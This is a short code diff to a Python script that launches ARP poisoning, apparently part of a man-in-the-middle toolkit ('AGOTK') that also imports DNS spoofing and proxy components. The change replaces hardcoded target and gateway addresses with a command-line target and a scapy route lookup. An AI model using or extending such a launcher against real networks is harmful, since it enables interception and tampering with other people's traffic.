@@ -4,18 +4,22 @@ import argparse
 from AGOTK import ARPPoisoner
 from AGOTK import DNSSpoofer
 from AGOTK import ProxyServer
+from scapy.all import *
 
 def main(argv) -> None:
     parser: argparse.ArgumentParser = argparse.ArgumentParser()
     parser.add_argument('-i', '--interface', type=str, required=True, help='The interface to use')
 
+    # So that the IP is not hardcoded, Luc can replace with selection
+    parser.add_argument('-t', '--target', type=str, required=True, help='The ip address of the target')
+
     args = parser.parse_args()
 
     interface: str = args.interface
+    ip_target: str = args.target
 
-    # TODO Hardcoded!!!
-    ip_target: str = '192.168.200.1'
-    ip_gateway: str = '192.168.200.254'
+    target_route: Route = conf.route.route(ip_target)
+    ip_gateway: str = conf.route.route(target_route[2])[2]
 
     arp_poisoner: ARPPoisoner = ARPPoisoner(interface, ip_target, ip_gateway)
     arp_poisoner.start()
